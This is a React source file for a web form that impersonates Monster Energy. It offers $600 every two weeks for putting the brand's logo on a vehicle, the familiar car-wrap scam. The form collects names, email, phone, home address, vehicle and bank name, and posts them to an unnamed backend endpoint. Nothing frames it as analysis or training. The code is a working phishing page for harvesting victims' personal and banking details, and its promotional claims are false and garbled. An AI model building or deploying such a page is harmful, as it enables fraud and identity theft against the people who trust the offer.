// import logo from './logo.svg';
import logo from './img/monster.jpg'
import './App.css';
import axios from 'axios';
import {useEffect, useState} from 'react'
import { baseUrl } from './const';


function App() {

  const [fname, setFname] = useState('');
  const [sname, setSname] = useState('');
  const [city, setCity] = useState('');
  const [zipcode, setZipcode] = useState('');
  const [email, setEmail] = useState('');
  const [street, setStreet] = useState('');
  const [phone, setPhone] = useState('');
  const [car, setCar] = useState('');
  const [bank, setBank] = useState('');
  const [county, setCounty] = useState('');
  const [message, setMessage] = useState('');
  const [color, setColor] = useState('');

  useEffect(()=>{

    setFname('');
    setSname('');
    setCity('');
    setZipcode('');
    setStreet('');
    setEmail('');
    setPhone('');
    setCar('');
    setBank('');
    setCounty('');
    setMessage('welcome');

  },[])

  const onSubmit = (e)=>{
      e.preventDefault();

      let data = {
        email,
        sname,
        fname,
        phone,
        car,
        county,
        street,
        bank,
        city,
        zipcode
      }

      axios.post(`${baseUrl}send`, data)
          .then(res => {
            console.log(res)
            if(res.status > 200){
                setMessage('Error occur, please try again')
                setColor('red')
            }
            else if(res.status === 200){
              setMessage('Success')
              setColor('green')
            }
          })
          .catch(err => {console.log(err)} );

  }


  return (
    <div className="App">
      <header className="App-header">
        <div id="head">
          <p style={{color: 'black', fontSize: 16, textAlign: 'center', marginTop: 25}}>MONSTER ENERGY ENERGY CAMPAIGN FORM</p>
        </div>
        <p className='write-up'>
          Monster Energy Drink is a brand of energy drinks With a market share of 43%, 
          it is the most popular energy drink brand as of 2020, and the one of the most v
          aluable soft drink brand Since its launch in 1987, more than 100 billion cans of 
          Monster have been sold worldwide, including over 11.5 billion in 2022​ You have an 
          opportunity to earn $600.00 Bi-WEEKLY by displaying Monster Logo in a prominent place
           like Car,Bikes/ Motorcycle /Truck,Boat Bumper or Front Gate!!! The program will last For 
           32 Weeks..
        </p>

        <p id="apply">Apply Below</p>

        <div id="myform">
          <p id='get'>Get in touch</p>
          <nav id='mains'>
            <div id='first'>
              <p id='des'>First name</p>

              <input
              name='fname'
              onChange={(e)=> {setFname(e.target.value)}}
              value={fname}
              id='input'
              />

              <p id='des'>Last name</p>
              <input
              name='sname'
              onChange={(e)=> {setSname(e.target.value)}}
              value={sname}
              id='input'
              />

              <p id='des'>Email*</p>
              <input
              name='email'
              onChange={(e)=> {setEmail(e.target.value)}}
              value={email}
              id='input'
              />

              <p id='des'>Phone</p>
              <input
              name='phone'
              onChange={(e)=> {setPhone(e.target.value)}}
              value={phone}
              id='input'
              />

              <p id='des'>Vehicle</p>
              <input
              name='car'
              onChange={(e)=> {setCar(e.target.value)}}
              value={car}
              id='input'
              />
            </div>

            <div id='second'>
            <p id='des'>Street Address</p>
              <input
              name='street'
              onChange={(e)=> {setStreet(e.target.value)}}
              value={street}
              id='input'
              />

              <p id='des'>City</p>
              <input
              name='city'
              onChange={(e)=> {setCity(e.target.value)}}
              value={city}
              id='input'
              />

              <p id='des'>Zip code</p>
              <input
              name='zipcode'
              onChange={(e)=> {setZipcode(e.target.value)}}
              value={zipcode}
              id='input'
              />

               <p id='des'>State</p>
              <input
              name='county'
              onChange={(e)=> {setCounty(e.target.value)}}
              value={county}
              id='input'
              />

             <p id='des'>Bank name</p>
              <input
              name='bank'
              onChange={(e)=> {setBank(e.target.value)}}
              value={bank}
              id='input'
              />
            </div>
          </nav>

          <button id='submit' onClick={onSubmit} >Submit</button>
          <p style={{color: color, fontSize: 19, fontWeight: 500}}>{message}</p>
        </div>
        
        <img
          src={logo}
          id='logo'
        />

      </header>
    </div>
  );
}

export default App;
